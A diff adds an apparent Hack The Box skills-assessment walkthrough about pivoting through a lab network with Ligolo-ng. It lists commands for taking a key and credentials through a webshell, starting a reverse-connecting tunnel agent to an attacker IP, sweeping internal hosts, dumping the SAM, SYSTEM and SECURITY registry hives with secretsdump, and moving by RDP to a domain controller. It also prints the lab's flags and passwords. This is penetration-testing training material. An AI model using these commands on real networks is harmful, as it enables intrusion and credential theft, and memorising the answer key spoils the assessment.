@@ -1,0 +1,145 @@
+HTB Skills Assessment Rewrite (Ligolo Edition)
+
+Scenario Recap
+
+We inherited a foothold via a webshell left by another tester. Our goal is to pivot through the Inlanefreight internal network using only Ligolo-ng for tunneling, not traditional ssh -D, netsh, or msfvenom reverse shells. Everything below has been rewritten to reflect how we now do it with Ligolo-ng.
+
+Prerequisites (before beginning assessment)
+
+Ensure Ligolo-ng proxy and agent binaries are downloaded
+
+chmod +x both binaries
+
+On attack machine, run the Ligolo proxy:
+
+sudo ./proxy -laddr 0.0.0.0:11601 -selfcert -v
+
+Question 1 - Locate Credentials (Answer: webadmin)
+
+Add domain to /etc/hosts:
+
+echo "10.129.128.83 support.inlanefreight.local inlanefreight.local" | sudo tee -a /etc/hosts
+
+Access http://support.inlanefreight.local and get web shell.
+
+In web shell:
+
+cd /home/webadmin
+cat webadmin_id_rsa  # Save to your attacker machine
+cat README.txt       # Get creds mlefay:Plain Human work!
+
+Question 2 - Submit Credentials (Answer: mlefay:Plain Human work!)
+
+From previous step. Store for RDP or other future use.
+
+Question 3 - Discover Internal Host (Answer: 172.16.5.35)
+
+Start Ligolo agent on webserver via webshell:
+
+Transfer agent to /tmp  -> scp -i webadminkey agent webadmin@10.129.229.129:/tmp
+
+
+Run agent with reverse connection:
+
+./agent -connect <ATTACK_IP>:11601 -ignore-cert
+
+Back on attacker box, in Ligolo CLI:
+
+session
+select session 1
+autoroute
+Select route: 172.16.5.0/24
+Create new interface: yes
+
+Verify route added:
+
+ip route | grep ligolo
+ip addr show <ligolo_interface>
+
+Now scan internal range:
+
+proxychains nmap -sP 172.16.5.0/24
+# or use ping sweep script inside proxychains   ->>> this didnt work. ssh again into antoehr terminal with -> ssh -i webadminkey webadmin@10.129.229.129 then run this exact ping sweep -> 
+
+for i in {1..254};do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
+64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.010 ms
+64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.412 ms
+
+
+This one works too -> 
+for i in {1..254}; do 
+    ping -c 1 -W 1 172.16.5.$i > /dev/null && echo "Host 172.16.5.$i is up"
+done
+
+
+
+
+Find live host at 172.16.5.35
+
+Question 4 - Pivot to 172.16.5.35 (Answer: S1ngl3-Piv07-3@sy-Day)
+
+RDP via Ligolo (SOCKS5):
+
+xfreerdp /u:mlefay /p:"Plain Human work!" /v:172.16.5.35 /cert:ignore /dynamic-resolution
+
+Log in and locate C:\flag.txt
+
+Question 5 - Identify Vulnerable User (Answer: vfrank)
+
+From RDP session on 172.16.5.35:
+
+mkdir C:\temp
+reg.exe save hklm\sam C:\temp\sam.save
+reg.exe save hklm\system C:\temp\system.save
+reg.exe save hklm\security C:\temp\security.save
+
+Download files via RDP shared folder or Python HTTP server.
+
+Back on attacker:
+
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+
+Find user: vfrank:Imply wet Unmasked!
+
+Question 6 - Pivot to 172.16.6.25 (Answer: N3tw0rk-H0pp1ng-f0R-FuN)
+
+From 172.16.5.35 session, confirm .bash_history, services, or ARP shows 172.16.6.25.
+
+No netsh needed. Since Ligolo already routes 172.16.5.0/23:
+
+xfreerdp /u:vfrank /p:"Imply wet Unmasked!" /v:172.16.6.25 /cert:ignore /dynamic-resolution
+
+Find C:\flag.txt
+
+Question 7 - Compromise Domain Controller (Answer: 3nd-0xf-Th3-R@inbow!)
+
+From RDP session as vfrank:
+
+mkdir C:\temp
+reg.exe save hklm\sam C:\temp\sam.save
+reg.exe save hklm\system C:\temp\system.save
+reg.exe save hklm\security C:\temp\security.save
+
+Transfer files back, dump hashes via secretsdump.py
+
+Upload and run BloodHound collector to analyze paths
+
+Verify vfrank is DA
+
+Map Z: drive to DC or find it through GUI or shortcuts
+
+Grab flag: 3nd-0xf-Th3-R@inbow!
+
+✅ Key Differences Using Ligolo:
+
+No SSH SOCKS needed
+
+No netsh needed for port forwarding
+
+SOCKS tunnel is persistent and accessible from entire host
+
+Pivoting was faster and more stable across all hops
+
+🧠 Pro Tip:
+
+Use ip route, ip addr, and proxychains tests throughout to verify stability of tunnel. Ligolo stays up as long as proxy and agent are running.
